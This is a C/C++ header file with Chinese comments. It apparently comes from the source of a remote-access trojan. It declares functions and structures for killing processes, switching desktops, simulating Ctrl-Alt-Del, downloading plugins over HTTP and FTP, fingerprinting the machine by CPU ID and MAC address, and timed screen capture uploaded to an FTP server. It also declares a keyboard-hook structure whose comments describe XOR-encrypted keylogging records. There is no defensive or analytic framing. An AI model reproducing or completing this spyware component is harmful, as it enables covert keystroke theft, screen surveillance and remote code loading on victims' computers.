#if !defined(AFX_UNTIL_H_INCLUDED)
#define AFX_UNTIL_H_INCLUDED
#include "RegEditEx.h"

#define ENCODEKEY 11

#ifndef SAFE_DELETE
#define SAFE_DELETE(p) {if (NULL != p) {delete p; p = NULL;}}
#endif

#ifndef SAFE_DELARRAY
#define SAFE_DELARRAY(p) {if (NULL != p) {delete[] p; p = NULL;}}
#endif

#ifndef ARRAY_LENGTH
#define ARRAY_LENGTH(a)	(sizeof(a)/sizeof(a[0]))
#endif

#ifndef SAFE_CLOSEHANDLE
#define SAFE_CLOSEHANDLE(p) {if (INVALID_HANDLE_VALUE != p) {CloseHandle(p); p = INVALID_HANDLE_VALUE;}}
#endif

typedef struct 
{
	unsigned ( __stdcall *start_address )( void * );
	void	*arglist;
	BOOL	bInteractive; // 是否支持交互桌面
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;

unsigned int __stdcall ThreadLoader(LPVOID param);

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
  LPDWORD lpThreadId, BOOL bInteractive = FALSE);
	
DWORD GetProcessID(LPCTSTR lpProcessName);
void KillProcess(LPCTSTR lpProcessName);
char *GetLogUserXP();
char *GetLogUser2K();
char *GetCurrentLoginUser();

BOOL SwitchInputDesktop();

BOOL SelectHDESK(HDESK new_desktop);
BOOL SelectDesktop(char *name);
BOOL SimulateCtrlAltDel();
BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName);
BOOL FtpDownLoad(TCHAR *szUrl,LPCTSTR szFileName,TCHAR *szPlugName,TCHAR *szUser,TCHAR *szPass);  
void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key);//解密
BOOL GetCPUID(LPSTR lpOutStr);
LPSTR GetFirstMac(LPSTR lpAddrMac);
LPSTR GetTSPMachineID(LPSTR lpOutStr);		//取TSP的机器标识符
BOOL GetRegValue(HKEY hMainKey, LPCTSTR szSubKey, LPCTSTR szItem, LPTSTR szValue);

DWORD MyGetFileSize(TCHAR *szFileName);
BOOL StartAutoSreen(LPVOID lparam,TCHAR *szIP,DWORD dwFlag);
void StopAutoScreen();
LPVOID GetShareMem(LPCTSTR lpName);
BOOL GetScreenState();
BOOL GetParentProcessPath(TCHAR *szSelfName,OUT CHAR *szFilePath,BOOL IsTerminate);
void ASCIIToUnicode(char* ASCIIString,wchar_t* WideChar);
int CompressFile(TCHAR *lpSrcFileName, TCHAR*lpDesFileName);

typedef struct FTPCONFIG
{
	TCHAR szUpIP[20];        //上传FTP服务器的IP
	WORD dwFtpProt;          //上传FTP的端口
	TCHAR szUserName[20];    //上传FTP用户名
	TCHAR szPass[20];        //上传FTP密码
	TCHAR szRemotoDir[0x50];   //上传到FTP的什么文件夹
	int m_nScrTimeInternal;	 //截屏时间间隔
	int m_nScrBitCount;		 //截屏位深

}FTPCONFIG,*pFTPCONFIG;

typedef struct AUTOSREECNCONFIG
{
	FTPCONFIG FtpConfig;
	//DWORD dwFTP
	TCHAR szFtpUser[20];//下载FTP的用户名 
	TCHAR szFtppass[20];//下载FTP的密码
	TCHAR szPlugName[50];//插件名
	TCHAR szDownLoadPlugUrl[50];//插件的下载Url

}AUTOSREECNCONFIG,*pAUTOSREECNCONFIG;

typedef struct 
{
	int nTimeInternal;	//截屏时间间隔
	int nBitCount;		//截屏位深
}INFOSCREEN, *PINFOSCREEN;


typedef struct
{
	DWORD dwType;
	int nCount;
	int nAvalible; 
	int nCapacity;
	//扩展属性（临时）

	AUTOSREECNCONFIG infoScreen;
	int nTypeAlarmSrn;
	//	TCHAR szCmdLine[1]; //命令行
}INFOSTATE, *PINFOSTATE;


#define	SIZE_IMM_BUFFER					128
#define XOR_ENCODE_VALUE				98	// 键盘记录加密的xor值

typedef	struct
{
	//DWORD   g_bSignalHook;
	DWORD	dwOffset;
	HHOOK	hGetMsgHook;
	HWND	hActWnd;	//current actived window
	BOOL	bIsOffline;
	char	strRecordFile[MAX_PATH];
	char	chKeyBoard[1024];
	char	str[SIZE_IMM_BUFFER];
}TShared;


#endif // !defined(AFX_UNTIL_H_INCLUDED)